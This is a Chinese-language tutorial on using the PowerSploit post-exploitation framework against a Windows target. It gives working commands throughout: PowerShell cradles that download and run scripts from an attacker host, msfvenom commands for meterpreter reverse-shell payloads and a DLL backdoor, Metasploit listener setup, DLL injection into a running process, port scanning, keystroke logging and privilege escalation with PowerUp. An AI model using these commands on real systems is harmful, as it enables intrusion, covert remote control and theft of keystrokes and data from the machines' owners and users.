PowerSploit是一款基于powershell的后渗透（Post-Exploitation）框架，集成大量渗透相关模块和功能。

项目地址：

https://github.com/mattifestation/PowerSploit

PowerSploit安装

kali linux下执行

git clone https://github.com/mattifestation/PowerSploit

然后将PowerSploit内所有内容放到apache的根目录下

执行

service apache2 start

打开浏览器，访问网页，出现如图所示页面即为成功

Powersploit 模块简介

CodeExecution 在目标主机执行代码

  • ScriptModification 在目标主机上创建或修改脚本
  • Persistence 后门脚本（持久性控制)
  • Persistence 后门脚本（持久性控制
  • Exfiltration 目标主机上的信息搜集工具
  • Mayhem 蓝屏等破坏性脚本
  • Recon 以目标主机为跳板进行内网信息侦查

Powersploit 模块运用

Invoke-Shellcode 此模块结合MSF使用可以达到意想不到的效果，下面会介绍用法;先在目标主机安装“Invoke-Shellcode”脚本，使用Get-Help + 脚本名可以查看使用方法，下载命令格式：

IEX (New-Object System.Net.WebClient).DownloadString(‘http://192.168.1.104/PowerSploit/CodeExecution/Invoke-Shellcode.ps1')

若失败可以使用下面的尝试：

IEX(New-Object Net.WebClient).DownloadString(“http://192.168.1.104/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")

或者这种：

PS C:\Users\STAR> $wc = new-object net.webclient
PS C:\Users\STAR> $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
PS C:\Users\STAR> iex $wc.downloadstring(‘http://192.168.1.104/PowerSploit/CodeExecution/Invoke-Shellcode.ps1')

下载完之后我们可以使用Get-Help来稍微看下它的使用帮助

在MSF里面使用reverse_https模块进行反弹，设置如下

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(multi/handler) > set LHOST 192.168.1.104
LHOST => 192.168.1.104
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444

本来在Invoke-Shellcode直接使用以下这条命令进行反弹的：

Invoke-Shellcode -Payload windows/meterpreter/reverse_https –Lhost 192.168.1.104 -Lport 4444 -Force

也可以这样：

EX(New-ObjectNet.WebClient).DownloadString(‘http://192.168.1.104/CodeExecution/Invoke-Shellcode.ps1')
Invoke-Shellcode -payloadwindows/meterpreter/reverse_https -lhost 192.168.1.104 -lport 4444 -force

若无法执行，请参考上一篇powershell的文章

但是Powersploit更新到了3.0, Invoke-Shellcode脚本没有Lhost和Lport参数，所以我们需要用到另外一种方法实现。
使用msfvenom生成一个powershell脚本。

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.104 LPORT=4444 -f powershell -o /var/www/html/test

然后将它下载到目标机器上，并执行

IEX(New-Object Net.WebClient).DownloadString(“http://192.168.1.104/CodeExecution/Invoke-Shellcode.ps1")
IEX (New-Object Net.WebClient).DownloadString(“http://192.168.1.104/test")
Invoke-Shellcode -Shellcode ($buf)

如果正常的话，你的kali机器上就会有上线的机器了，但是基于https和http的反弹在网络不稳定的时候很不稳定，所以我们也可以用tcp的形式来反弹一个shell

首先：
使用msfvenom生成dll后门

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.104 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll

说明：目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp

然后在msf下作如下配置：

msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.105
LHOST => 192.168.1.105
msf exploit(multi/handler) > set LpORT 6667
LpORT => 6667
msf explo

it(multi/handler) > exploit

powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门
首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程

IEX (New-Object Net.WebClient).DownloadString(“http://192.168.1.104/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")

Invoke-DllInjection -ProcessID 5816 -Dll C:\Users\Administrator\Desktop\lltest.dll

不出意外的话，kali下就应该可以获取到shell了

Invoke-Portscan端口扫描

他肯定没有nmap好用，但是各有优势吧，这个东西小，powershell窗口一关，他就消失了，但是nmap的话，你还要在人家服务器上下一个nmap么？？动静太大了吧 – –

同样的，下载

IEX (New-Object Net.WebClient).DownloadString(“http://192.168.1.105/PowerSploit/Recon/Invoke-Portscan.ps1")

使用方法：

Invoke-Portscan -Hosts （ip，两个ip中使用，分割） -Ports “端口，一样的,分割”

Invoke-Portscan -Hosts 192.168.102.1,192.168.102.128 -Ports “80,22,3389”

Get-Keystrokes

键盘记录，这玩意比metasploit下的那个键盘记录牛的多，一个是他记录的很详细，还有一个就是，他连你鼠标点的什么都记录，你说牛不牛

IEX (New-Object Net.WebClient).DownloadString(“http://192.168.102.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1")

使用方法：

Get-Keystrokes -LogPath + <保存位置>

PowerUp

Powerup是本地特权提升的一些调用方法，功能相当强大，拥有众多实用的脚本来帮助我们寻找目标主机Windows服务漏洞进行提权，也是 PowerShell Empire和PowerSploit 的一部分。

通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。
